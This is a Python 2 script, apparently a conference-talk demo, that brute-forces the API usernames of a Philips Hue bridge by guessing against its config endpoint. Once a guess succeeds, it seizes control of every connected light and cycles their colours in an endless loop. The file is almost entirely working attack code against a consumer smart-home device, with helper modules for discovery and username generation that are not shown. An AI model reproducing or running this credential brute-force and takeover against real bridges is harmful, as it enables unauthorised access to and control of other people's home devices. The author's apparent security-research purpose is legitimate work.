#!/usr/bin/env python
"""I know this is terrible looking code. It's what came out of all the
experimentation necessary to make this work. Hopefully I can clean it
up and release something more presentable after the talk.

I hate those people who never get around to releasing their code or
slides because it looks ugly.

"""
from pprint import pprint
import string
import random
import time
import string
import json
import sys

# monkeypatch requests
import utils

import requests

import discover
import users

def control_the_lights(hue_url, username):
    """ Do something to get people's attention """
    api_url = hue_url + 'api/{}/'.format(username)
    print "Searching for lights"
    res = s.post(api_url + 'lights')
    pprint(res.json())
    light_color = 0
    while True:
        res = s.get(api_url + 'lights')
        light_ids = res.json().keys()
        pprint(res.json())
        for light_id in light_ids:
            light_color += 25500
            light_color = light_color % 65535
            body = {
                "hue": light_color,
                "sat": 255,
                "on": True,
                "bri": 255,
            }
            res = s.put(api_url + 'lights/{}/state'.format(light_id),
                        data=json.dumps(body))
            pprint(res.json())
            time.sleep(1)

s = requests.Session()
s.headers = {}  # make our packet smaller. The server ignores headers
hue_url = discover.find_hue()

if len(sys.argv) > 1:
    # oh boy, adding options. rewrite this after the talk...
    prefix = sys.argv[1]
else:
    prefix = users.USERNAME_PREFIX

count = 0
start_time = time.time()
interval = start_time
username_generators = []
for next_guess in users.charset():
    username_generators.append(users.generate_username(prefix + next_guess))

while True:
    # shuffle the charset, but cycle every guess before repeating
    for usergen in username_generators:
        username = usergen.next()
        res = s.get(hue_url + 'api/{}/config'.format(username))
        count += 1
        if 'whitelist' in res.json():  # we got back a full config string...
            print "=" * 80
            print "\nFound correct username: ", username
            print "Elapsed time: ", (time.time() - start_time) / 60, 'min'
            print "Total Attempts: ", count
            print "=" * 80
            control_the_lights(hue_url, username)
            exit()
        #pprint(res.json())
        if count % 100 == 0:
            now = time.time()
            elapsed = now - start_time
            print count, elapsed, 100 / (now - interval)
            interval = now
    random.shuffle(username_generators)
